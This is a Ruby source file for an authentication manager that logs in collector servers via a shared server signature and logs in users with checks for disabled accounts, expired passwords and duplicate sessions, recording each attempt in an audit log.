#
#  Auth Manager, manages the authentications
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class AuthManager
  include Singleton
  include RCS::Tracer

  def initialize

  end

  def auth_server(username, pass, version, type, peer)
    # if we are in archive mode, no collector is allowed to login

    if LicenseManager.instance.check :archive
      raise "Collector services cannot login on archive server"
    end

    trace :debug, "Server auth: #{username}, #{version}, #{type}, #{peer}"

    server_sig = ::Signature.where({scope: 'server'}).first

    # the Collectors are authenticated only by the server signature
    if pass.eql? server_sig['value']

      # take the external ip address from the username
      instance, address = username.split(':')

      # if it's a collector, create or update the component
      Collector.collector_login(instance, version, address, peer) if type.eql? 'collector'

      username = "#{instance}:#{type}"

      trace :info, "#{type.capitalize} [#{instance}] logged in"

      # delete any previous session from this server
      SessionManager.instance.delete_server(username)
      # create the new auth sessions
      return SessionManager.instance.create(username, [:server], peer, version)
    end

    return nil
  end

  def auth_user(username, pass, version, peer)
    user = User.where(name: username).first

    # user not found
    if user.nil?
      Audit.log :actor => username, :action => 'login', :user_name => username, :desc => "User '#{username}' not found"
      trace :warn, "User [#{username}] NOT FOUND"
      return nil
    end

    # user is disabled
    unless user.enabled
      Audit.log :actor => username, :action => 'login', :user_name => username, :desc => "User '#{username}' cannot access because is disabled"
      trace :warn, "User [#{username}] DISABLED"
      return nil
    end

    if user.password_expired?
      Audit.log :actor => username, :action => 'login', :user_name => username, :desc => "User '#{username}' cannot access because password is expired"
      trace :warn, "User [#{username}] EXPIRED PASSWORD"
      return nil
    end

    # the account is valid
    if user.has_password?(pass)
      auth_level = []
      # symbolize the privs array
      user[:privs].each do |p|
        auth_level << p.downcase.to_sym
      end

      # we have to check if it was already logged in
      # in this case, invalidate the previous session
      sess = SessionManager.instance.get_by_user(username)
      unless sess.nil?
        Audit.log :actor => username, :action => 'logout', :user_name => username, :desc => "User '#{username}' forcibly logged out by system"
        PushManager.instance.notify('logout', {rcpt: sess.user[:_id], text: "Your account has been used on another machine"})
        SessionManager.instance.delete(sess[:cookie])
      end

      Audit.log :actor => username, :action => 'login', :user_name => username, :desc => "User '#{username}' logged in"

      trace :info, "[#{peer}] Auth login: #{username}"

      # create the new auth sessions
      return SessionManager.instance.create(user, auth_level, peer, version)
    end

    Audit.log :actor => username, :action => 'login', :user_name => username, :desc => "Invalid password for user '#{username}'"
    trace :warn, "User [#{username}] INVALID PASSWORD"
    return nil
  end

end #AuthManager

end #DB::
end #RCS::